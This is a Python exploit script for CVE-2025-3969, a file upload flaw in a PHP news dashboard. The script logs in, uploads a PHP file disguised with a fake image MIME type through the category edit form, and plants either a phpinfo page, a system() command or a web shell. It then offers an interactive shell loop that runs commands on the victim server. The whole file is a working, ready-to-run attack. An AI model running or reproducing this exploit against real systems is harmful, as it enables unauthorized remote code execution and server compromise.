import requests
import re
import random
from argparse import ArgumentParser
from uuid import uuid4

# References:
# https://www.cve.org/CVERecord?id=CVE-2025-3969
# https://github.com/zzZxby/Vulnerability-Exploration/blob/main/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A12.md

RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
PURPLE = '\033[95m'
CYAN = '\033[96m'
RESET = '\033[0m'

def banner():
    print(f'''
          
{RED}M#"""""""'M{RESET}                             dP       oo                      {RED}M"""""""`YM{RESET}                              
{RED}##  mmmm. `M{RESET}                            88                               {RED}M  mmmm.  M{RESET}                              
{RED}#'        .M{RESET} 88d888b. .d8888b. .d8888b. 88  .dP  dP 88d888b. .d8888b.    {RED}M  MMMMM  M{RESET} .d8888b. dP  dP  dP .d8888b. 
{RED}M#  MMMb.'YM{RESET} 88'  `88 88ooood8 88'  `88 88888"   88 88'  `88 88'  `88    {RED}M  MMMMM  M{RESET} 88ooood8 88  88  88 Y8ooooo. 
{RED}M#  MMMM'  M{RESET} 88       88.  ... 88.  .88 88  `8b. 88 88    88 88.  .88    {RED}M  MMMMM  M{RESET} 88.  ... 88.88b.88'       88 
{RED}M#       .;M{RESET} dP       `88888P' `88888P8 dP   `YP dP dP    dP `8888P88    {RED}M  MMMMM  M{RESET} `88888P' 8888P Y8P  `88888P' 
{RED}M#########M{RESET}                                                       .88    {RED}MMMMMMMMMMM{RESET}                              
                                                              d8888P                                              
                        {RED}Exploitation of CVE-2025-3969{RESET}
          
                                                                                       
        Developer: {PURPLE}@stuub{RESET}
        Github: {YELLOW}https://github.com/stuub{RESET}
        Coffee? {GREEN}https://buymeacoffee.com/stuub{RESET}
        Content-Type matching is great, but someone forgot about the rest :P

        ''')

DEFAULT_PAYLOAD = """
<?php
phpinfo();
?>
"""

WEB_SHELL_PAYLOAD = """
<?php
if(isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    echo "<pre>" . shell_exec($cmd) . "</pre>";
}
?>
"""

DEFAULT_FILENAME = "helloifreadingthis.php"
MIME_TYPES = ['image/jpeg', 'image/png', 'image/gif', 'image/pjpeg', 'image/jpg', 'image/x-png']

def payload_logic(cmd=None, webshell=False):
    if webshell:
        return WEB_SHELL_PAYLOAD
    elif cmd:
        return f"<?php system('{cmd}'); ?>"
    return DEFAULT_PAYLOAD  # if none specified, assign phpinfo payload (see above)

def setup_mpt(category_name, php_filename, php_payload, boundary):
    parts = []
    def add_part(name, value, filename=None, content_type=None):
        part = f'--{boundary}\r\nContent-Disposition: form-data; name="{name}"'
        if filename:
            part += f'; filename="{filename}"'
        part += '\r\n'
        if content_type:
            part += f'Content-Type: {content_type}\r\n'
        part += '\r\n'
        part += value + '\r\n'
        parts.append(part)
    add_part("category_name", category_name)
    add_part("category_image", php_payload, filename=php_filename, content_type=random.choice(MIME_TYPES))
    add_part("btnEdit", "Update")
    parts.append(f'--{boundary}--\r\n')
    return ''.join(parts).encode()

def login(target_url, username, password):
    login_url = f"{target_url}/news/index.php"
    payload = {
        'username': username,
        'password': password,
        'btnLogin': ''
    }
    session = requests.Session()
    response = session.post(login_url, data=payload)
    if "Login failed" in response.text:
        print(f"{RED}[-]{RESET} Login failed.")
        return None
    elif "dashboard.php" in response.url:
        print(f"{GREEN}[+]{RESET} Login successful!")
        return session
    else:
        print(f"{RED}[-]{RESET} Unexpected response during login.")
        print(f"    - {login_url} -> {response.status_code}")
        return None

def get_uploads(target_url, session):
    url = f"{target_url}/news/category.php"
    response = session.get(url)
    if response.status_code == 200:
        print(f"{YELLOW}[!]{RESET} Fetching active category image url @ {YELLOW}{url}{RESET}")
        pattern = r'<img src="(upload/category/\d{4,}-\d{4}-\d{2}-\d{2}\.php)"'
        php_files = re.findall(pattern, response.text)
        if php_files:
            print(f"{GREEN}[+]{RESET} Found our upload!: ")
            for php_file in php_files:
                print(f"    - {GREEN}{php_file}{RESET}")
                print(f"        URL -> {GREEN}{target_url}/news/{php_file}{RESET}\n")
            return php_files
        else:
            print(f"{RED}[-]{RESET} Unable to retrieve uploaded file :(")
            return []
    else:
        print(f"{RED}[-]{RESET} Failed to load category.php. {RED}HTTP {response.status_code}{RESET}")
        return []

def upload(target_url, category_id, session, php_payload, filename):
    url = f"{target_url}/news/edit-category.php?id={category_id}"
    boundary = "----WebKitFormBoundary" + uuid4().hex
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "Referer": url,
        "Origin": target_url
    }
    data = setup_mpt("Exploit", filename, php_payload, boundary)
    print(f"{YELLOW}[+]{RESET} Sending payload to {YELLOW}{url}{RESET}")
    response = session.post(url, headers=headers, data=data)
    if response.status_code == 200:
        print(f"{GREEN}[+]{RESET} Exploit delivered.")
        php_files = get_uploads(target_url, session)
        return php_files
    return []

def int_shell(session, webshell_url):
    print(f"{GREEN}[+]{RESET} Interactive shell mode. Type {GREEN}'exit'{RESET} to quit.\n")
    while True:
        command = input("shell> ").strip()
        if command.lower() == 'exit':
            print(f"{YELLOW}[!]{RESET} Exiting interactive mode. See ya :)")
            break
        
        url = f"{webshell_url}?cmd={command}"
        try:
            response = session.get(url)
            if response.status_code == 200:
                output = re.sub(r'<pre>(.*?)</pre>', r'\1', response.text, flags=re.DOTALL)
                print(output)
            else:
                print(f"{RED}[-]{RESET} Error executing command: {RED}{command}{RESET}. {RED}HTTP {response.status_code}{RESET}")
        except Exception as e:
            print(f"{RED}[-]{RESET} Exception occurred: {e}")


def main():
    parser = ArgumentParser(description="News Publishing Site Dashboard v1.0- Unrestricted File Upload to RCE")
    
    # Authentication
    auth_group = parser.add_argument_group("Authentication")
    auth_group.add_argument("-C", "--cookie", help="PHPSESSID or full Cookie header (use this or username/password)")
    auth_group.add_argument("-u", "--username", help="Username for login (required if no cookie provided)")
    auth_group.add_argument("-p", "--password", help="Password for login (required if no cookie provided)")
    
    # Positionals
    parser.add_argument("target", help="Target base URL (e.g., http://example.com)")
    parser.add_argument("id", help="Category ID for edit-category.php?id=")

    # Command
    parser.add_argument("-c", "--command", help="Command to execute (e.g. id)")
    parser.add_argument("-w", "--webshell", action="store_true", help="Use webshell payload")
    parser.add_argument("-i", "--interactive", action="store_true", help="Interactive shell mode")

    args = parser.parse_args()

        # if not session-based entry, username:password is used
    if args.cookie:
        session = requests.Session()
        session.cookies.set('PHPSESSID', args.cookie)

    elif args.username and args.password:
        session = login(args.target, args.username, args.password)
    elif args.username or args.password:
        print(f"{RED}[-]{RESET} You must provide both username and password.")
        exit(1)
    
    else:
        print(f"{RED}[-]{RESET} You must provide either a cookie or a username and password.")
        exit(1)

    if not session:
        print(f"{RED}[-]{RESET} Failed to authenticate.")
        exit(1)

    # mfs want interactive but interactive want webshell
    if args.interactive:
        args.webshell = True

    payload = payload_logic(cmd=args.command, webshell=args.webshell)

    print(f"\n{GREEN}[+]{RESET} Payload being used: ", end="")
    if args.webshell:
        print(f"{GREEN}Web Shell (Interactive or via URL){RESET}\n")
    elif args.command:
        print(f"{GREEN}User Defined Payload: {YELLOW}{args.command}{RESET}\n")
    else:
        print(f"{GREEN}PHP Info Payload (default){RESET}\n")

    php_files = upload(args.target, args.id, session, payload, DEFAULT_FILENAME)
    
    if args.interactive and php_files:
        webshell_url = f"{args.target}/news/{php_files[0]}"
        int_shell(session, webshell_url)

if __name__ == "__main__":
    banner()
    main()
